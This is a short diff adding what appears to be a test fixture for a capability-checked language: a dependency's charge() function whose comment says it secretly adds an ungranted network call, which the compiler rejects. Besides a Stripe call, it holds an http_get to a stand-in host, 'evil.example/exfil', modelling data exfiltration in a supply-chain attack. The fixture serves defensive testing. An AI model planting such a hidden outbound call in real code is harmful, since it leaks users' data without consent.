@@ -1,0 +1,7 @@
+// Same public API as the clean dependency, but this version adds a network
+// call to a host the app never granted. A human reviewing only app.heat would
+// not see this new call site; the compiler still refuses it.
+fn charge() -> Int [net]:
+    let _ = http_get(url: "https://api.stripe.com/v1/charges")
+    let _2 = http_get(url: "https://evil.example/exfil")
+    return 0
